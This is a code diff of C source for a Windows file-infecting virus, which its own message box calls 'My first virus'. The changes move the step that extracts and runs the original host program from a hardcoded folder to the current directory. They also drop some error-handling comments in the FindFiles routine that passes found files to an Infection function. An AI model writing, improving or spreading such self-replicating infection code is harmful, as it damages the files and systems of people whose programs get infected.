@@ -80,13 +80,15 @@ int main(int argc, char *argv[])
 												printf("2 generation\n");
 												MessageBox(0,CharToWchar("virus"),CharToWchar("My first virus"),0);
 												DWORD r = 0;
-												char chStr2[38] = "c:\\virrr\\ahaha.exe";
+												wchar_t DirSpec[MAX_PATH];
+												get_current_directory(MAX_PATH, DirSpec);
+												WcsCat(DirSpec, CharToWchar("\\ahaha.exe"));
 
 												set_file_pointer(hfPat, -sizeof(vir_sz), 0, 2);
 												if(!read_file(hfPat, &vir_sz, sizeof(vir_sz), &r, NULL)) printf("error read vir_sz");
 												
 												set_file_pointer(hfPat, vir_sz, 0, 0);
-												HANDLE hfPat2 = create_file(CharToWchar(chStr2), 0xC0000000, 0x00000001, NULL, 2, 0x00000080, 0);
+												HANDLE hfPat2 = create_file(DirSpec, 0xC0000000, 0x00000001, NULL, 2, 0x00000080, 0);
 												if((DWORD)hfPat2 == 0xffffffff) {/*printf("Open vir file error!");*/ close_handle(hfPat2); return 0; }
 												DWORD w1;
 												unsigned char buf[1024];
@@ -100,10 +102,11 @@ int main(int argc, char *argv[])
 												STARTUPINFO si;
 												PROCESS_INFORMATION pi;
 												GetStartupInfo(&si);
-												if(!CreateProcess(CharToWchar(chStr2),NULL,NULL,NULL,FALSE,0,NULL,NULL,&si,&pi))return 0;
+												if(!CreateProcess(DirSpec,NULL,NULL,NULL,FALSE,0,NULL,NULL,&si,&pi))return 0;
 												HANDLE proc = pi.hProcess;
 												WaitForSingleObject(proc, INFINITE);
-												DeleteFile(CharToWchar(chStr2));
+												
+												DeleteFile(DirSpec);
 	}
 	else
 	{
@@ -284,14 +287,7 @@ bool FindFiles(int gen, HANDLE hSource)
 		   Infection(gen, FindFileData.cFileName, hSource);
      
        }
-    
-   //    dwError = GetLastError();
        find_close(hFind);
-  /*     if (dwError != ERROR_NO_MORE_FILES) 
-       {
-          printf ("FindNextFile error. Error is %u\n", dwError);
-          return false;
-       }*/
     }
     return true;
 }
